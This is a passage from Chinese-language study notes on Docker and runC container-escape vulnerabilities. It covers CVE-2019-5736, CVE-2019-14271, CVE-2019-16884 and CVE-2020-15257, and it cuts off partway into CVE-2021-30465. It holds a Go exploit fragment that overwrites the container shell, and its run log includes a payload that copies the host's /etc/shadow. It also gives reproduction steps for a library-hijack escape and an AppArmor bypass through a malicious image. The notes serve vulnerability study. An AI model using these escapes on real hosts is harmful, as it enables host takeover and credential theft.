fmt.Fprintln(fd, <span class="string">&quot;#!/proc/self/exe&quot;</span>)</span><br><span class="line">	err = fd.Close()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;[+] Overwritten /bin/bash successfully&quot;</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;个人猜测一般使用”&#x2F;bin&#x2F;sh”作为要替换成执行“#!&#x2F;proc&#x2F;self&#x2F;exe”的程序，是由于模拟受害者触发漏洞的操作，一般都是执行docker exec -it {container-id} &#x2F;bin&#x2F;sh，用以和受损容器交互&#x3D;&#x3D;</p>
<p>步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 编译POC</span><br><span class="line">containervuln@containervuln-VM:~/CVE-2019-5736$ go build ./main.go </span><br><span class="line"></span><br><span class="line"># 启动容器，挂载POC目录模拟容器已被攻击者控制</span><br><span class="line">containervuln@containervuln-VM:~/CVE-2019-5736$ sudo docker run -itd --name cve -v $PWD:/cve centos</span><br><span class="line">c45a9514a34c4e0200a69046741d61f2998b17d5cc7d29547765026eda25e0ac</span><br><span class="line"></span><br><span class="line"># 运行POC，此时容器内的/bin/ls已被覆写成 #!/proc/self/exe，攻击者正在循环遍历/proc文件夹，等待捕获runC进程</span><br><span class="line">containervuln@containervuln-VM:~/CVE-2019-5736$ sudo docker exec cve /cve/main</span><br><span class="line">[+] Overwritten /bin/bash successfully</span><br></pre></td></tr></table></figure>

<p>接着另外启动一个终端，去执行容器内的<code>/bin/ls</code>，模拟受害者触发漏洞（一般是<code>/bin/bash</code>或<code>/bin/sh</code>和容器交互）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">containervuln@containervuln-VM:~$ sudo docker exec cve ls</span><br><span class="line">No help topic for &#x27;/usr/bin/ls&#x27;</span><br></pre></td></tr></table></figure>

<p>攻击者程序回显：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">containervuln@containervuln-VM:~/CVE-2019-5736$ sudo docker exec cve /cve/main</span><br><span class="line">[+] Overwritten /bin/bash successfully</span><br><span class="line"># 下面是执行docker exec cve ls之后的新增内容</span><br><span class="line">[+] Found the PID: 46</span><br><span class="line">[+] Successfully got the file handle</span><br><span class="line">[+] Successfully got write handle &amp;&#123;0xc000494120&#125;</span><br><span class="line">[+] The command executed is#!/bin/bash </span><br><span class="line"> cat /etc/shadow &gt; /tmp/shadow &amp;&amp; chmod 777 /tmp/shadow</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<ul>
<li>宿主机调用runC，并加入到容器的namespace，被攻击者程序捕获到PID号</li>
<li>攻击者用这个PID号，通过”&#x2F;proc&#x2F;{PID}&#x2F;exe”获取runC可执行二进制文件的只读句柄（绕过了chroot以及namespace），这个句柄被添加到了容器进程的<code>/proc/self/fd/</code>下</li>
<li>当runC结束占用它的二进制文件时，攻击者再通过之前获得的只读句柄，以写方式打开，从而能够改写runC二进制可执行文件的行为</li>
<li>等到受害者再次触发调用runC，就会转而执行攻击者的payload（这里是在宿主机的&#x2F;tmp&#x2F;shadow下写内容）</li>
</ul>
<h3 id="13-2-3-CVE-2019-14271-特权进程使用容器文件"><a href="#13-2-3-CVE-2019-14271-特权进程使用容器文件" class="headerlink" title="13.2.3 CVE-2019-14271 - 特权进程使用容器文件"></a>13.2.3 CVE-2019-14271 - 特权进程使用容器文件</h3><p>Blog:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://bestwing.me/CVE-2019-14271-docker-escape.html">https://bestwing.me/CVE-2019-14271-docker-escape.html</a></li>
<li><a target="_blank" rel="noopener" href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/docker-software/plumbing/docker-cp/CVE-2019-14271/%E5%88%86%E6%9E%90/CVE-2019-14271%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/docker-software/plumbing/docker-cp/CVE-2019-14271/%E5%88%86%E6%9E%90/CVE-2019-14271%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41667409/article/details/121557358">https://blog.csdn.net/qq_41667409/article/details/121557358</a></li>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/485728">https://cloud.tencent.com/developer/news/485728</a></li>
</ul>
<p>POC: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/iridium-soda/CVE-2019-14271_Exploit">https://github.com/iridium-soda/CVE-2019-14271_Exploit</a></li>
</ul>
<p><code>docker cp</code>命令的源码分析: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-cp/docker-cp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/docker%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/docker-container/docker-container-cp/docker-cp-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90.html</a></li>
</ul>
<p><strong>背景</strong></p>
<p>.so库文件篡改</p>
<p>chroot</p>
<p><strong>原理</strong></p>
<blockquote>
<p>受CVE-2019-14271漏洞影响的Docker在执行<code>docker cp</code>命令时，<code>docker-tar</code>进程可能在<code>chroot</code>到容器rootfs后，加载nsswitch动态库。攻击者可以将容器内的nsswitch动态库修改为恶意文件，从而获取<code>docker-tar</code>进程权限，实现容器逃逸。</p>
</blockquote>
<p>漏洞成因是由于，<code>docker cp</code>进行拷贝的时候，将docker-tar此进程先<code>chroot</code>到容器内，然而此时使用的.so文件也是容器内的，而<code>docker-tar</code>进程本身没有容器化，意味着仍然拥有高权限，所以此时如果容器内的.so被恶意篡改，那么可能造成Docker容器逃逸 </p>
<p>&#x3D;&#x3D;容器外的docker-tar进程去执行容器内的文件&#x3D;&#x3D;</p>
<p>执行<code>docker cp</code>后，Docker daemon会启动一个<code>docker-tar</code>进程来完成这项复制任务。若要从容器内复制文件到宿主机上，<code>docker-tar</code>原理：会切换进程的根目录（执行<code>chroot</code>）到容器根目录，然后将需要复制的文件或目录打tar包传递给Docker daemon，Docker daemon负责将内容解包到用户指定的宿主机目标路径。</p>
<p>原本使用<code>chroot</code>，是位了避免了符号连接导致的路径穿越，但是<code>docker-tar</code>仅仅<code>chroot</code>到了容器的文件系统，而程序本身不是容器化的，其在主机命名空间中运行，这意味着<code>docker-tar</code>不受cgroup或seccomp的限制。如果这时候<code>docker-tar</code>加载了容器内部的恶意动态链接库（本来应该从主机文件系统中加载库，但是由于<code>docker-tar</code> <code>chroot</code>到了容器内，所以从容器文件系统中加载动态链接库），被注入恶意代码，那就能够获得对主机完全的root访问权限</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41667409/article/details/121557358">https://blog.csdn.net/qq_41667409/article/details/121557358</a></p>
<p>漏洞分析需要分析<code>docker cp</code>命令的执行过程，以及调用的<code>docker-tar</code>和<code>docker-untar</code>命令</p>
<p>官方的修补方法是<code>docker cp</code>命令在进入容器之前先强制加载容器外部的库文件</p>
<p><strong>复现</strong></p>
<p>环境：Docker 19.03.0</p>
<p>POC准备的大致过程：</p>
<ol>
<li>patch一个<code>docker-tar</code>进程会用到的库：<code>libnsss_*.so</code></li>
<li>在执行这个库的过程中劫持<code>docker-cp</code>进程</li>
<li>劫持到了就在宿主机上执行恶意行为，成功标志：<ol>
<li>宿主机的文件系统挂载到了容器内的&#x2F;host_fs</li>
<li>宿主机的&#x2F;tmp下多了一个hack文件，内容为“hacked”</li>
</ol>
</li>
</ol>
<blockquote>
<ul>
<li>找出docker-tar具体会加载那些容器内的动态链接库</li>
<li>下载对应动态链接库源码，为其增加一个<code>__attribute__((constructor))</code>属性的函数<code>run_at_link</code>（该属性意味着在动态链接库被进程加载时，<code>run_at_link</code>函数会首先被执行），在<code>run_at_link</code>函数中放置我们希望<code>docker-tar</code>执行的攻击载荷（payload）；编译生成动态链接文件</li>
<li>编写辅助脚本”&#x2F;breakout“，将辅助脚本和步骤二生成的恶意动态链接库放入恶意容器，等待用户执行<code>docker cp</code>命令，触发漏洞</li>
</ul>
</blockquote>
<p>可以使用<code>inotify-tools</code>等工具监控docker-tar等对容器内动态链接库的使用情况（需要知道容器根目录在宿主机上的绝对路径，<code>/proc/1/mounts</code>，里面Docker的merged层）</p>
<p>Link: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41667409/article/details/121557358">https://blog.csdn.net/qq_41667409/article/details/121557358</a></p>
<hr>
<p>&#x3D;&#x3D;懒人版&#x3D;&#x3D;</p>
<p>拉取实验容器：<code>sudo docker pull swr.cn-southwest-2.myhuaweicloud.com/container_pentest/cve-2019-14271:v0.1</code></p>
<p>&#x3D;&#x3D;已经有了一个漏洞专属的快照，已保存实验容器&#x3D;&#x3D;</p>
<p>运行容器：<code>sudo docker run -it -d --name cve swr.cn-southwest-2.myhuaweicloud.com/container_pentest/cve-2019-14271:v0.1</code></p>
<p>确认宿主机和容器内的库文件版本相同，避免兼容性问题：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">containervuln@containervuln-VM:~$ ls -lah /lib/x86_64-linux-gnu/libnss_files.so.2</span><br><span class="line">lrwxrwxrwx 1 root root 20 4月   9 11:27 /lib/x86_64-linux-gnu/libnss_files.so.2 -&gt; libnss_files-2.31.so</span><br><span class="line"></span><br><span class="line">containervuln@containervuln-VM:~$ sudo docker exec -ti cve ls -lah /lib/x86_64-linux-gnu/libnss_files.so.2</span><br><span class="line">lrwxrwxrwx 1 root root 20 Aug 17  2020 /lib/x86_64-linux-gnu/libnss_files.so.2 -&gt; libnss_files-2.31.so</span><br></pre></td></tr></table></figure>



<p>对容器执行<code>docker cp</code>命令，触发漏洞，执行上述流程：<code>sudo docker cp cve:/etc/hosts .</code></p>
<p>验证，发现容器内的&#x2F;host_fs，挂载了宿主机文件系统，以及宿主机的&#x2F;tmp&#x2F;下出现文件hack，内容为”hacked“</p>
<h3 id="12-2-4-CVE-2019-16884-容器内procfs被挂载"><a href="#12-2-4-CVE-2019-16884-容器内procfs被挂载" class="headerlink" title="12.2.4 CVE-2019-16884 - 容器内procfs被挂载"></a>12.2.4 CVE-2019-16884 - 容器内procfs被挂载</h3><p>Blog: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/linux-security-features/what-you-can-actually-do/LSM/apparmor/CVE-2019-16884/CVE-2019-16884%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/linux-security-features/what-you-can-actually-do/LSM/apparmor/CVE-2019-16884/CVE-2019-16884%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0.html</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/h4ckm310n/Container-Vulnerability-Exploit/blob/main/CVE-2019-16884/README.md">https://github.com/h4ckm310n/Container-Vulnerability-Exploit/blob/main/CVE-2019-16884/README.md</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/265343">https://www.anquanke.com/post/id/265343</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/h4ckm310n/Container-Vulnerability-Exploit/blob/main/CVE-2019-16884/README.md">https://github.com/h4ckm310n/Container-Vulnerability-Exploit/blob/main/CVE-2019-16884/README.md</a></p>
<p><strong>背景</strong></p>
<p><code>AppArmor</code></p>
<p><strong>原理</strong></p>
<p>在容器镜像中可以声明一个VOLUME, 挂载至&#x2F;proc, 欺骗runC使其认为<code>AppArmor</code>已经成功应用，从而绕过<code>AppArmor</code>策略&#x3D;&#x3D;实现绕过docker-default规则&#x3D;&#x3D;</p>
<p>在容器中，<code>AppArmor</code>配置是通过将配置名称写入&#x2F;proc&#x2F;self&#x2F;attr&#x2F;exec来生效的：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">setprocattr</span><span class="params">(attr, value <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    <span class="comment">// Under AppArmor you can only change your own attr, so use /proc/self/</span></span><br><span class="line">    <span class="comment">// instead of /proc// like libapparmor does</span></span><br><span class="line">    path := fmt.Sprintf(<span class="string">&quot;/proc/self/attr/%s&quot;</span>, attr)</span><br><span class="line"></span><br><span class="line">    f, err := os.OpenFile(path, os.O_WRONLY, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line">    _, err = fmt.Fprintf(f, <span class="string">&quot;%s&quot;</span>, value)</span><br><span class="line">    <span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，只有在&#x2F;proc是一个proc文件系统的时候，<code>AppArmor</code>才会生效。因此，攻击者可以通过挂载一个普通的文件系统到&#x2F;proc，从而让runC以为它向proc文件系统的exec文件写入了<code>AppArmor</code>配置。在挂载文件系统之前，runC会先进行检查，可以发现它不允许在&#x2F;proc里面挂载文件系统，然而它却没有检查挂载到&#x2F;proc本身的情况，也就是说挂载文件系统到&#x2F;proc仍然是允许的：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkMountDestination</span><span class="params">(rootfs, dest <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">    invalidDestinations := []<span class="type">string</span>&#123;</span><br><span class="line">        <span class="string">&quot;/proc&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">for</span> _, invalid := <span class="keyword">range</span> invalidDestinations &#123;</span><br><span class="line">        path, err := filepath.Rel(filepath.Join(rootfs, invalid), dest)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> path != <span class="string">&quot;.&quot;</span> &amp;&amp; !strings.HasPrefix(path, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%q cannot be mounted because it is located inside %q&quot;</span>, dest, invalid)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>runC在应用<code>AppArmor</code>策略时，是通过向&#x2F;proc&#x2F;self&#x2F;attr&#x2F;exec写入<code>exec &lt;Profile Name&gt;</code>实现的</p>
<p>procfs是一个伪文件系统，实际是由内核虚拟的文件系统。因此如果我们可以控制&#x2F;proc，则实际的<code>AppArmor</code>策略就不会被内核应用</p>
<p>事实上，runC在挂载时有做黑名单校验，不允许挂载的目的路径为<code>/proc</code></p>
<p>但是在具体校验过程中，有一个严重的逻辑错误，校验不完全，而且测试的代码也写错了，导致形成漏洞</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _, invalid := <span class="keyword">range</span> invalidDestinations &#123;</span><br><span class="line">    path, err := filepath.Rel(filepath.Join(rootfs, invalid), dest)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 下面这个没有判断path == &quot;.&quot;</span></span><br><span class="line">    <span class="keyword">if</span> path != <span class="string">&quot;.&quot;</span> &amp;&amp; !strings.HasPrefix(path, <span class="string">&quot;..&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;%q cannot be mounted because it is located inside %q&quot;</span>, dest, invalid)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>复现</strong></p>
<p>环境：</p>
<ul>
<li>Docker: 19.03.2</li>
<li>containerd: 1.2.6</li>
<li>runC: 1.0.0-rc8</li>
</ul>
<p>拉取实验容器：<code>sudo docker pull ubuntu:bionic-20221215</code></p>
<p>创建一个测试用AppArmor策略配置文件，testprofile:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tunables/global&gt;</span></span></span><br><span class="line"></span><br><span class="line">profile testprofile flags=(attach_disconnected,mediate_deleted) &#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;abstractions/base&gt;</span></span></span><br><span class="line">    file,</span><br><span class="line">    deny /vol<span class="comment">/** w,</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>deny /vol** w</code>意思是不允许在&#x2F;vol文件夹下写入</p>
<p>宿主机将该配置文件加入内核：<code>sudo apparmor_parser -a ./testprofile</code></p>
<p>之后：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建测试用文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> vol</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行正常容器，验证AppArmor配置正常起作用</span></span><br><span class="line"><span class="built_in">sudo</span> docker run -it --<span class="built_in">rm</span> --security-opt <span class="string">&quot;apparmor=testprofile&quot;</span> -v ~/vol:/vol ubuntu:bionic-20221215 bash</span><br></pre></td></tr></table></figure>

<p>之后尝试向&#x2F;vol文件夹创建文件，发现是被拒绝的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@2f20b18a18ab:/# echo &quot;123&quot; &gt; /vol/testfile</span><br><span class="line">bash: /vol/testfile: Permission denied</span><br></pre></td></tr></table></figure>



<p>回到宿主机，创建一个root目录，模拟容器的根目录，并在其中创建proc目录，模拟容器的procfs：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p root/proc/self/attr</span><br><span class="line"><span class="built_in">mkdir</span> root/proc/self/fd</span><br><span class="line"><span class="built_in">touch</span> root/proc/self/status</span><br><span class="line"><span class="built_in">touch</span> root/proc/self/attr/exec</span><br><span class="line"><span class="built_in">touch</span> root/proc/self/fd/4</span><br><span class="line"><span class="built_in">touch</span> root/proc/self/fd/5</span><br></pre></td></tr></table></figure>

<p>创建一个Dockerfile，将刚刚创建的root目录复制到容器根目录，并挂载&#x2F;proc卷：</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:bionic-<span class="number">20221215</span></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> root /</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="language-bash"> /proc</span></span><br></pre></td></tr></table></figure>

<p>构建恶意镜像：<code>sudo docker build -t malimage .</code></p>
<p>基于恶意镜像创建攻击者容器：<code>sudo docker run -it --rm --security-opt &quot;apparmor=testprofile&quot; -v ~/vol:/vol malimage bash</code></p>
<p>容器内执行：<code>echo &quot;haha&quot; &gt; /vol/testfile</code></p>
<p>发现可以写入，并且宿主机&#x2F;vol文件夹下出现文件，证明AppArmor策略被绕过</p>
<hr>
<p>13.2.5 CVE-2020-15257</p>
<p>Blog: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/h4ckm310n/Container-Vulnerability-Exploit/tree/main/CVE-2020-15257">https://github.com/h4ckm310n/Container-Vulnerability-Exploit/tree/main/CVE-2020-15257</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/332334413">https://zhuanlan.zhihu.com/p/332334413</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/471532280">https://zhuanlan.zhihu.com/p/471532280</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8925">https://xz.aliyun.com/t/8925</a></li>
</ul>
<p>POC: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/nccgroup/abstractshimmer">https://github.com/nccgroup/abstractshimmer</a></li>
</ul>
<p><strong>背景</strong></p>
<p><code>containerd</code>通过<code>containerd-shim</code>来控制runC，<code>containerd-shim</code>提供了各种RPC API，<code>containerd</code>通过这些API来向<code>containerd-shim</code>发送请求，从而对容器进行管理（例如创建和删除容器）</p>
<p><strong>原理</strong></p>
<p><code>containerd-shim</code>的RPC socket是“\x00”开头的，也就是说这是一个抽象socket而不是一个文件socket，抽象socket<strong>并不受到mount namespace的隔离，只受到network namespace的隔离</strong></p>
<p>这意味着，当容器与宿主共享网络的时候（Docker中的“–net&#x3D;host”参数），这个socket同样会暴露在容器中，而容器中的进程可以通过向这个socket发送请求来控制宿主的<code>containerd-shim</code></p>
<p>官方修复方法是把原本的抽象socket替换成文件socket，这样这个socket就会受到mount namespace的隔离&#x3D;&#x3D;Doker官方本来是不把这个视为漏洞，因为容器和宿主机共享net namespace本来就不安全，偏配置类错误&#x3D;&#x3D;</p>
<p>使用AppArmor和SELinux的防护：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/332334413">https://zhuanlan.zhihu.com/p/332334413</a></p>
<p><strong>复现</strong></p>
<p>失败 - 放弃</p>
<p>POC运行不起来</p>
<hr>
<h3 id="12-2-6-CVE-2021-30465-TOCTTOU"><a href="#12-2-6-CVE-2021-30465-TOCTTOU" class="headerlink" title="12.2.6 CVE-2021-30465 - TOCTTOU"></a>12.2.6 CVE-2021-30465 - TOCTTOU</h3><p>Blog: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/h4ckm310n/Container-Vulnerability-Exploit/blob/main/CVE-2021-30465/README.md">https://github.com/h4ckm310n/Container-Vulnerability-Exploit/blob/main/CVE-2021-30465/README.md</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/WRRjLKk_C9pq2WlvnA-NZQ">https://mp.weixin.qq.com/s/WRRjLKk_C9pq2WlvnA-NZQ</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qMAAxUF7BPSosIjoWVA8ZQ">https://mp.weixin.qq.com/s/qMAAxUF7BPSosIjoWVA8ZQ</a></li>
</ul>
<p>POC:</p>
<p><strong>背景</strong></p>
<p>容器的卷挂载：</p>
<blockquote>
<p>挂载⽬录，对容器来说，只是简单把⽬录与容器的⽬录做<strong>映射绑定</strong>，⽽⽬录的权限还是在主机，需要⽤户⾃制维护，⼿动处理权限等问题</p>
<p>卷 (Volume) 是受控存储，挂载卷后是由容器引擎进⾏管理维护的，也就是把对应卷的所有权交给了容器引擎（本次漏洞的核⼼点）</p>
</blockquote>
<p><strong>原理</strong></p>
<p>当a容器起来后，恶意程序疯狂的在挂载的⽬录下刷新软连接与⽬录的关系。与此同时若b容器也像a容器⼀样挂载了相同中的卷和对应卷下⾯的⽬录</p>
<p>因为卷所有权这个时候是在引擎内，并且a容器相同卷下的⽬录还在刷新软连接（相同于创建软连接）这个时间在容器引擎内部就会存在资源竞争，形成了漏洞</p>
<p>CVE-2021-30465是一个<code>runC</code>漏洞，利用这个漏洞可以通过条件竞争攻击来将宿主的目录挂载到容器中。</p>
<p>在容器中挂载volume之前，<code>runC</code>会先调用<code>SecureJoin</code>来检查路径并拼接到容器的根目录下，如果路径是一个符号链接，则会替换成该符号链接指向的对应路径：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span 